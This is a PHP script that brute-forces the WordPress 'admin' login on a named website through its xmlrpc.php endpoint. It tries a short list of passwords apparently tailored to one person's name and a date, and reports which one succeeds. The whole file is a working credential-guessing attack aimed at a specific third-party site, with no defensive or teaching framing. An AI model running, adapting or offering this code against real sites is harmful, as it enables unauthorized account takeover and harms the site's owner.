<?php


$appkey="";
$BLOGURL = "http://yokoo-web.com";




$USERNAME = "admin";
$passwords = [
	"yokofumiya",
	"YokofumiYa",
	"YokoFumiya",
	"yoko0919",
];

foreach ($passwords as $value) {
	$result = blogger_getUsersBlogs($appkey, $BLOGURL,$USERNAME, $value);
	if(is_null($result)){
		echo "NULL : ".$value."\n";
		break;
	}else{
		if($result){
			echo "YES >>>> ".$value."\n";
			break;
		}else{
			echo "NO : ".$value."\n";
		}
		sleep(1);
	}
}

function get_response($URL, $context) {
    if(!function_exists('curl_init')) {
    	die ("Curl PHP package not installedn");
    }
   
    /*Initializing CURL*/
    $curlHandle = curl_init();
   
    /*The URL to be downloaded is set*/
    curl_setopt($curlHandle, CURLOPT_URL, $URL);
    curl_setopt($curlHandle, CURLOPT_HEADER, false);
    curl_setopt($curlHandle, CURLOPT_HTTPHEADER, array("Content-Type: text/xml"));
    curl_setopt($curlHandle, CURLOPT_POSTFIELDS, $context);
    curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
   
    /*Now execute the CURL, download the URL specified*/
    $response = curl_exec($curlHandle);


    return $response;
}

/*Creating the blogger.getUsersBlogs request which takes on following parameters
 appkey: ignored (pass some blank value)
 username,
 password,
 */
function blogger_getUsersBlogs($appkey, $BLOGURL, $username, $password) {
   
   $request = xmlrpc_encode_request("blogger.getUsersBlogs",
      array($appkey, $username, $password));
  
    /*Making the request to wordpress XMLRPC of your blog*/
    echo $BLOGURL."/xmlrpc.php\n";
    $xmlresponse = get_response($BLOGURL."/xmlrpc.php", $request);
    $response = xmlrpc_decode($xmlresponse);

    /*Printing the response on to the console*/
    if(is_null($response)){
    	return null;
    }else{

    	if(array_key_exists("faultCode", $response)){
	    	return false;
	    }
	    return true;

    }
}


